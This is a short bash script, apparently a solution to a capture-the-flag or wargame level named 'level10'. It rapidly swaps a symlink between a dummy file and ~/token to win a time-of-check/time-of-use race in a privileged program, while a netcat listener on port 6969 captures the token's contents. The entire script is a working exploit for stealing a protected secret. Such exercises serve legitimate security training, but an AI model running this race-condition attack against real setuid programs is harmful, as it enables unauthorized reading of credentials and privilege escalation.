#!/bin/bash

touch /tmp/swap
for i in {1..5}; do
  ln -sf /tmp/swap /tmp/link;
  ln -sf ~/token /tmp/link;
done &
for x in {1..5}; do
  nc -l 6969;
done &
for y in {1..5}; do
  ~/level10 /tmp/link 127.0.0.1;
done
